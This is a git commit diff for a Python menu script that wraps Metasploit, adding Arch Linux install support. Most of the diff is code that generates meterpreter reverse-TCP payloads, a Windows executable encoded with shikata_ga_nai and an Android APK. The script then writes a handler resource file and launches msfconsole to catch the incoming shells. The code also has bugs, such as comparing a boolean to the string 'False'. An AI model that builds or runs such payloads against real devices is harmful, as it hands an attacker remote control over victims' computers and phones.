c05556335e7d0c8ee2edef61507483434852c513
deepfuckrock <94917022+deepfuckrock@users.noreply.github.com>
2023-06-29 15:54:03 +0200

    CHANGELOG: -added compatibilite for arch-based systems (already tested: manjaro) -simplyfied code

--- base.py
+++ base.py
@@ -1,7 +1,6 @@
-
 import Installer
 import program
-import CLC
+
 try:
     import colorama
 except ImportError:
@@ -17,10 +16,28 @@ import os
 import time
 import pip
 
-CLC.CLC()
+def CLC():
+    command = 'clear'
+    if os.name in ('nt', 'dos'):  # If Machine is running on Windows, use cls
+        command = 'cls'
+    os.system(command)
+
+def quickchech():
+    print('checking (0%)\r')
+    check=os.system('which msfconsole > /dev/null')
+    print("checking (75%)\r")
+    if check==256:
+        print("running installer")
+        program.uno()
+    return
+
+CLC()
 
 print(Fore.LIGHTCYAN_EX + 'Welcome!' + Style.RESET_ALL)
 time.sleep(2)
+
+##quickchech()
+
 try:
     request = requests.get("https://www.google.com", timeout=5)
 except (requests.ConnectionError, requests.Timeout):
@@ -38,7 +55,7 @@ print()
 
 todo=input('Put here the wanted option (1,2...): ')
 while True:
-        todoc=todo in ['1','2','3','4','5']
+        todoc=todo in ['1','2','3','4','5','6']
         if todoc==False:
             print(Fore.RED + 'select a valid number' + Style.RESET_ALL)
             quit()
@@ -48,10 +65,17 @@ while True:
 if todo=='1':
     program.uno()
 if todo=='2':
+    quickchech()
     program.dos()
 if todo=='3':
+    quickchech()
     program.tres()
 if todo=='4':
+    quickchech()
     program.cuatro()
 if todo=='5':
+    quickchech()
     program.cinco()
+if todo=='6':
+    os.system('sudo rm -r __pycache__')
+    print('cache erased')
--- program.py
+++ program.py
@@ -2,7 +2,6 @@ import platform
 import Installer
 import time
 import os
-import CLC
 import subprocess
 import sys
 from xml.dom import NotFoundErr
@@ -13,8 +12,14 @@ except ImportError:
     Installer.install()
 from colorama import Fore, Style
 
+def CLC():
+    command = 'clear'
+    if os.name in ('nt', 'dos'):  # If Machine is running on Windows, use cls
+        command = 'cls'
+    os.system(command)
+
 def uno():
-    CLC.CLC()
+    CLC()
     print(Fore.LIGHTCYAN_EX + 'Installer executing in 3 secs' + Style.RESET_ALL)
     time.sleep(3)
     sistema=platform.system()
@@ -23,65 +28,63 @@ def uno():
                 print(Fore.RED +'re-run with sudo'+ Style.RESET_ALL)
                 quit()
             else:
-                os.system('apt-get update')
-                os.system('apt-get install curl wget gnupg2')
-                os.system('curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall')            
-                os.system('chmod +x msfinstall')
-                os.system('./msfinstall')
+                posible=["1","2"]
+                print(f"if {Fore.GREEN}arch{Fore.RESET}=1\nif {Fore.GREEN}debian-based{Fore.RESET}=2\n")
+                distro=input('answer: ')
+                opa=distro in posible
+                if opa=="False":
+                    exit()
+                if distro=="1":
+                    os.system('pacman -Syu')
+                    os.system('pacman install curl wget gnupg2 metasploit')
+                if distro=="2":
+                    os.system('apt-get update')
+                    os.system('apt-get install curl wget gnupg2')
+                    os.system('curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall')            
+                    os.system('chmod +x msfinstall')
+                    os.system('./msfinstall')
     else:
        print(Fore.RED + 'You are on windows, pls, switch to Linux' + Style.RESET_ALL)
        quit()
 
 def dos():
-    cmpr=os.system('which msfvenom')
-    if cmpr=='1':
-        print(Fore.RED + 'Run the installer first' + Style.RESET_ALL)
-    else:
-        lhost=input('Ip: ')
-        lport=input('Port: ')
-        frmt=input('Format: ')
-        os.system('msfvenom -p windows/meterpreter/reverse_tcp lhost=' + lhost + ' lport=' + lport + ' -f '+frmt+ ' -e x86/shikata_ga_nai -o payload.exe')
-        with open('initmsfc', 'w') as f:
-            f.write('use exploit/multi/handler\n')
-            f.write('set payload windows/meterpreter/reverse_tcp\n')
-            f.write('set LHOST ' + lhost + '\n') 
-            f.write('set LPORT ' + lport + '\n')
-            f.write('exploit')
-        os.system('msfconsole -r initmsfc')
+    lhost=input('Ip: ')
+    lport=input('Port: ')
+    frmt=input('Format: ')
+    os.system('msfvenom -p windows/meterpreter/reverse_tcp lhost=' + lhost + ' lport=' + lport + ' -f '+frmt+ ' -e x86/shikata_ga_nai -o payload.exe')
+    with open('initmsfc', 'w') as f:
+        f.write('use exploit/multi/handler\n')
+        f.write('set payload windows/meterpreter/reverse_tcp\n')
+        f.write('set LHOST ' + lhost + '\n') 
+        f.write('set LPORT ' + lport + '\n')
+        f.write('exploit')
+    os.system('msfconsole -r initmsfc')
 
 def tres():
-    cmpr=os.system('which msfvenom')
-    if cmpr=='1':
-        print(Fore.RED + 'Run the installer first' + Style.RESET_ALL)
-    else:
-        lhost=input('Ip: ')
-        lport=input('Port: ')
-        os.system('msfvenom -p android/meterpreter/reverse_tcp lhost=' + lhost + ' lport=' + lport + ' -o payload.apk')
-        with open('initmsfc', 'w') as f:
-            f.write('use exploit/multi/handler\n')
-            f.write('set payload android/meterpreter/reverse_tcp\n')
-            f.write('set LHOST ' + lhost + '\n') 
-            f.write('set LPORT ' + lport + '\n')
-            f.write('exploit')
-        print('Puting metasploit listening')
-        os.system('msfconsole -r initmsfc')
+    lhost=input('Ip: ')
+    lport=input('Port: ')
+    os.system('msfvenom -p android/meterpreter/reverse_tcp lhost=' + lhost + ' lport=' + lport + ' -o payload.apk')
+    with open('initmsfc', 'w') as f:
+        f.write('use exploit/multi/handler\n')
+        f.write('set payload android/meterpreter/reverse_tcp\n')
+        f.write('set LHOST ' + lhost + '\n') 
+        f.write('set LPORT ' + lport + '\n')
+        f.write('exploit')
+    print('Puting metasploit listening')
+    os.system('msfconsole -r initmsfc')
 
 def cuatro():
-    cmpr=os.system('which msfconsole')
-    if cmpr=='1':
-        print(Fore.RED + 'Run the installer first' + Style.RESET_ALL)
-    else:
-        lhost=input('Ip: ')
-        lport=input('Port: ')
-        payload=input('Payload (per exemple: android/meterpreter/reverse_tcp): ')
-        with open('initmsfc', 'w') as f:
-            f.write('use exploit/multi/handler\n')
-            f.write('set payload ' + payload +'\n')
-            f.write('set LHOST ' + lhost + '\n') 
-            f.write('set LPORT ' + lport + '\n')
-            f.write('exploit')
-        print('Puting metasploit listening')
-        os.system('msfconsole -r initmsfc')
+    lhost=input('Ip: ')
+    lport=input('Port: ')
+    payload=input('Payload (per exemple: android/meterpreter/reverse_tcp): ')
+    with open('initmsfc', 'w') as f:
+        f.write('use exploit/multi/handler\n')
+        f.write('set payload ' + payload +'\n')
+        f.write('set LHOST ' + lhost + '\n') 
+        f.write('set LPORT ' + lport + '\n')
+        f.write('exploit')
+    print('Puting metasploit listening')
+    os.system('msfconsole -r initmsfc')
 
 def cinco():
     os.system('rm -r payload.exe')
